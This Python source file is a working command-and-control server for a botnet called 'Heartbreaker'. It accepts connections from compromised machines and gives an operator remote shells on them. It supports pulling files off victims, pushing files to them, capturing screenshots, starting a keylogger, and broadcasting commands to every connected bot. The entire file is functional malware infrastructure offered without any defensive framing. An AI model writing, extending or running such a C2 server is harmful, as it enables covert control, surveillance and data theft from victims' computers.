#!/usr/bin/python3

import socket
import threading
import json
import os
import base64



# For screenshot function
count = 0

# Sending command to all bots
def send2all(target, data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

# Interacting with the session bots
def shell(target, ip):

    def reliable_send(data):
        json_data = json.dumps(data) 
        target.send(json_data.encode('utf-8')) # HERE IS WHERE THE DATA IS ENCODED TO SEND THROUGH SOCKET


    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
                return json.loads(data)
            except ValueError:
                continue



    global count
    while True:
        command = input(f"*HeartShell-{str(ip)}#: ") # data type String
        # reliable_send(command.encode('utf-8')) # already dumps by json (? data type) --> need convert??
        reliable_send(command)  # answer line 27: no convert --> JSON doesn't apply to bytes

        # End shell session
        if command == 'q':
            break

        # Close session's connection
        elif command == 'exit':
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue

        # Download File
        elif command[:8] == "download":
            with open(command[9:], 'wb') as f:
                file_content = reliable_recv()
                # f.write(base64.b64decode(file_content).decode('utf-8'))
                f.write(base64.b64decode(file_content))

        # Upload file
        elif command[:6] == "upload":
            try:
                with open(command[7:], 'rb') as f:
                    file_content = base64.b64encode(f.read()) 
                    reliable_send(file_content.decode('utf-8'))
            except:
                failed = b"Upload Failed!"      # Base64 encode works with bytes
                reliable_send(base64.b64encode(failed).decode('utf-8'))
        
        # Screenshot bot monitor
        elif command[:10] == "screenshot":
            with open(f"screenshot-{count}.png", "wb") as f:
                image = reliable_recv()
                
                image_decoded = base64.b64decode(image)

                if image[:3] == "[-]":
                    print(image_decoded)
                else:
                    f.write(image_decoded)
                    count += 1

        # Starting keylogger
        elif command[:12] == "keylog_start":
            continue
        else:
            # result = target.recv(1024) # data type Bytes
            result = reliable_recv() # need decode??? --> nope, already decode in the function
            print(result)





# Main server function
def server():
    # Count variable assigning to each bot, incrementing each time a connection is established
    global clients

    while True:
        # Escape loop function
        if stop_threads:
            break
        s.settimeout(1)

        try:
            # Accepting connection
            target, ip = s.accept()

            # Adding info of the newly connected target
            targets.append(target)
            ips.append(ip)
            print(f"{str(targets[clients])}:{str(ips[clients])} Has Connected!")
            
            # Target count incremented
            clients += 1
        except:
            pass

# Socket object
global s
targets = []
ips = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Server info
host = "0.0.0.0"
port = 1234
s.bind((host, port))
s.listen(5)

# Target start with index (id) 0
clients = 0
stop_threads = False

# Notification
print("[+] Waiting for connections ...")

t = threading.Thread(target=server)
t.start()

# Interactive with C2 server
while True:
    # User input command
    command = input("* Heartbreaker: ")
    
    # Listing all connected target
    if command == "targets":
        count = 0

        # For loop getting all the ip from the ips list
        for ip in ips:
            print(f"Session {str(count)} <---> {str(ip)}")
            count += 1

    # Choosing a sesstion to interact (metasploit)
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            target_num = targets[num]
            target_ip = ips[num]
            shell(target_num, target_ip)
        except:
            print("[-] No session under that number!")

    # Closing the server
    elif command == "exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t.join()
        break

    # Send to all bots
    elif command[:7] == "sendall":
        len_of_targets = len(targets)
        i = 0
        try:
            while i < len_of_targets:
                target_index = targets[i]
                print(target_index)
                send2all(target_index, command)
                i += 1
        except:
            print("[-] Failed commanding all bots!")

    else:
        print("[-] Command Doesn't Exist!")
